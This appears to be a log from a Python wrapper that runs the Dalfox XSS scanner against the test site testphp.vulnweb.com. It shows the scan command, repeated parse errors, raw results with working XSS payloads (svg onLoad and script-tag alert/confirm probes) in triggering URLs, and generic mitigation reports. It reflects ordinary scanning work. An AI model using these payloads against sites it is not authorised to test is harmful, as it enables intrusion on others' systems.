+2025/03/22 22:55:24 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:24 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:24 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:25 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:55:49 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:55:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:55:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:55:58 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+[37m[*] [0mFinish massive scan!
+
+2025-03-22 22:55:58,691 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:55:58,692 - INFO - security_api.__main__ - 
+Found 4 XSS vulnerabilities:
+2025-03-22 22:55:58,692 - INFO - security_api.__main__ - 
+=== Vulnerability #1 ===
+2025-03-22 22:55:58,692 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:55:58,694 - INFO - security_api.__main__ - Parameter: 
+2025-03-22 22:55:58,694 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:55:58,694 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:55:58,694 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:55:58,695 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter ''
+2025-03-22 22:55:58,695 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:55:58,696 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:55:58,696 - INFO - security_api.__main__ -   1. Sanitize input for parameter ''
+2025-03-22 22:55:58,697 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:55:58,697 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:55:58,698 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:55:58,698 - INFO - security_api.__main__ - 
+=== Vulnerability #2 ===
+2025-03-22 22:55:58,699 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:55:58,699 - INFO - security_api.__main__ - Parameter: test
+2025-03-22 22:55:58,699 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:55:58,700 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:55:58,701 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:55:58,701 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:55:58,702 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:55:58,702 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:55:58,702 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'test'
+2025-03-22 22:55:58,703 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:55:58,704 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:55:58,704 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:55:58,704 - INFO - security_api.__main__ - 
+=== Vulnerability #3 ===
+2025-03-22 22:55:58,705 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:55:58,705 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:55:58,705 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:55:58,706 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:55:58,706 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:55:58,706 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:55:58,707 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:55:58,707 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:55:58,707 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:55:58,709 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:55:58,709 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:55:58,709 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:55:58,710 - INFO - security_api.__main__ - 
+=== Vulnerability #4 ===
+2025-03-22 22:55:58,710 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:55:58,711 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:55:58,711 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:55:58,711 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:55:58,712 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:55:58,712 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:55:58,713 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:55:58,713 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:55:58,713 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:55:58,714 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:55:58,714 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:55:58,715 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:55:58,715 - INFO - security_api.__main__ - 
+=== General Recommendations ===
+2025-03-22 22:55:58,715 - INFO - security_api.__main__ - - Implement proper input validation and output encoding
+2025-03-22 22:55:58,716 - INFO - security_api.__main__ - - Use Content Security Policy (CSP) headers
+2025-03-22 22:55:58,717 - INFO - security_api.__main__ - - Sanitize user input before rendering
+2025-03-22 22:55:58,717 - INFO - security_api.__main__ - - Use security frameworks or libraries for XSS protection
+2025-03-22 22:55:58,717 - INFO - security_api.__main__ - - Implement proper HTML escaping for dynamic content
+2025-03-22 22:57:06,491 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:57:06,496 - INFO - security_api.__main__ - Starting Dalfox XSS scan test...
+2025-03-22 22:57:06,497 - INFO - security_api.__main__ - Scanning 4 URLs for domain: testphp.vulnweb.com
+2025-03-22 22:57:06,498 - INFO - security_api.dalfox_scanner - Starting Dalfox XSS scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_225706.txt --format json --output dalfox_results\dalfox_testphp.vulnweb.com_20250322_225706.txt --follow-redirects --mining-dict --mining-dom --silence --mass
+2025-03-22 22:57:48,408 - INFO - security_api.dalfox_scanner - Dalfox stdout: [
+{"type":"G","inject_type":"BUILTIN","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=%27","param":"","payload":"toGrepping","evidence":"","cwe":"","severity":"Low","message_id":51,"message_str":"Found dalfox-error-mysql via built-in grepping / payload: toGrepping"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/search.php?test=query%27%3E%3Csvg%2Fclass%3D%27dalfox%27onLoad%3Dalert%281%29%3E","param":"test","payload":"'\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e","evidence":"49 line:   syntax to use near '\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e'' at line 1","cwe":"CWE-79","severity":"High","message_id":203,"message_str":"Triggered XSS Payload (found DOM Object): test='\u003e\u003csvg/class='dalfox'onLoad=alert(1)\u003e"},
+{"type":"R","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E","param":"artist","payload":"\"\u003e\u003cscript/\"\u003ca\"/src=data:=\".\u003ca,[].some(confirm)\u003e","evidence":"49 line:  syntax to use near '\"\u003e\u003cscript/\"\u003ca\"/src=data:=\".\u003ca,[].some(confirm)\u003e' at line 1","cwe":"CWE-79","severity":"Medium","message_id":661,"message_str":"Reflected Payload in HTML: artist=\"\u003e\u003cscript/\"\u003ca\"/src=data:=\".\u003ca,[].some(confirm)\u003e"},
+{"type":"V","inject_type":"inHTML-URL","poc_type":"plain","method":"GET","data":"http://testphp.vulnweb.com/artists.php?artist=1%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E","param":"artist","payload":"\u003c/ScriPt\u003e\u003csCripT class=dalfox\u003ealert(1)\u003c/sCriPt\u003e","evidence":"","cwe":"CWE-79","severity":"High","message_id":581,"message_str":"Triggered XSS Payload (found DOM Object): artist=\u003c/ScriPt\u003e\u003csCripT class=dalfox\u003ealert(1)\u003c/sCriPt\u003e"},
+{}]
+
+2025-03-22 22:57:48,410 - ERROR - security_api.dalfox_scanner - Dalfox stderr: [37m[*] [0mParallel testing to 'testphp.vulnweb.com' => 4 urls
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:57:13 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 687 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 643 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 645 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 644 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:57:40 ERROR: could not unmarshal event: parse error: expected string near offset 646 of 'cookiePart...'
+2025/03/22 22:57:41 ERROR: could not unmarshal event: parse error: expected string near offset 637 of 'cookiePart...'
+2025/03/22 22:57:41 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:57:41 ERROR: could not unmarshal event: parse error: expected string near offset 638 of 'cookiePart...'
+2025/03/22 22:57:48 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:57:48 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+2025/03/22 22:57:48 ERROR: could not unmarshal event: parse error: expected string near offset 694 of 'cookiePart...'
+[37m[*] [0mFinish massive scan!
+
+2025-03-22 22:57:48,414 - INFO - security_api.__main__ - 
+Scan Results:
+2025-03-22 22:57:48,415 - INFO - security_api.__main__ - 
+Found 4 XSS vulnerabilities:
+2025-03-22 22:57:48,416 - INFO - security_api.__main__ - 
+=== Vulnerability #1 ===
+2025-03-22 22:57:48,416 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:57:48,417 - INFO - security_api.__main__ - Parameter: 
+2025-03-22 22:57:48,417 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:57:48,418 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:57:48,418 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:57:48,419 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter ''
+2025-03-22 22:57:48,419 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:57:48,420 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:57:48,420 - INFO - security_api.__main__ -   1. Sanitize input for parameter ''
+2025-03-22 22:57:48,421 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:57:48,421 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:57:48,422 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:57:48,422 - INFO - security_api.__main__ - 
+=== Vulnerability #2 ===
+2025-03-22 22:57:48,423 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:57:48,424 - INFO - security_api.__main__ - Parameter: test
+2025-03-22 22:57:48,424 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:57:48,425 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:57:48,425 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:57:48,426 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'test'
+2025-03-22 22:57:48,426 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:57:48,427 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:57:48,427 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'test'
+2025-03-22 22:57:48,428 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:57:48,428 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:57:48,429 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:57:48,429 - INFO - security_api.__main__ - 
+=== Vulnerability #3 ===
+2025-03-22 22:57:48,429 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:57:48,430 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:57:48,430 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:57:48,430 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:57:48,432 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:57:48,432 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:57:48,433 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:57:48,433 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:57:48,434 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:57:48,434 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:57:48,435 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:57:48,435 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:57:48,436 - INFO - security_api.__main__ - 
+=== Vulnerability #4 ===
+2025-03-22 22:57:48,436 - INFO - security_api.__main__ - URL: 
+2025-03-22 22:57:48,437 - INFO - security_api.__main__ - Parameter: artist
+2025-03-22 22:57:48,437 - INFO - security_api.__main__ - Severity: High
+2025-03-22 22:57:48,438 - INFO - security_api.__main__ - Payload: 
+2025-03-22 22:57:48,438 - INFO - security_api.__main__ - 
+Details:
+2025-03-22 22:57:48,439 - INFO - security_api.__main__ - Description: Cross-Site Scripting vulnerability found in parameter 'artist'
+2025-03-22 22:57:48,439 - INFO - security_api.__main__ - Impact: This vulnerability allows attackers to inject malicious scripts that can steal user data, hijack sessions, or deface the website.
+2025-03-22 22:57:48,439 - INFO - security_api.__main__ - 
+Mitigation Steps:
+2025-03-22 22:57:48,440 - INFO - security_api.__main__ -   1. Sanitize input for parameter 'artist'
+2025-03-22 22:57:48,440 - INFO - security_api.__main__ -   2. Implement Content Security Policy (CSP)
+2025-03-22 22:57:48,442 - INFO - security_api.__main__ -   3. Use HTML encoding for dynamic content
+2025-03-22 22:57:48,442 - INFO - security_api.__main__ -   4. Validate input against whitelist
+2025-03-22 22:57:48,443 - INFO - security_api.__main__ - 
+=== General Recommendations ===
+2025-03-22 22:57:48,444 - INFO - security_api.__main__ - - Implement proper input validation and output encoding
+2025-03-22 22:57:48,444 - INFO - security_api.__main__ - - Use Content Security Policy (CSP) headers
+2025-03-22 22:57:48,445 - INFO - security_api.__main__ - - Sanitize user input before rendering
+2025-03-22 22:57:48,445 - INFO - security_api.__main__ - - Use security frameworks or libraries for XSS protection
+2025-03-22 22:57:48,446 - INFO - security_api.__main__ - - Implement proper HTML escaping for dynamic content
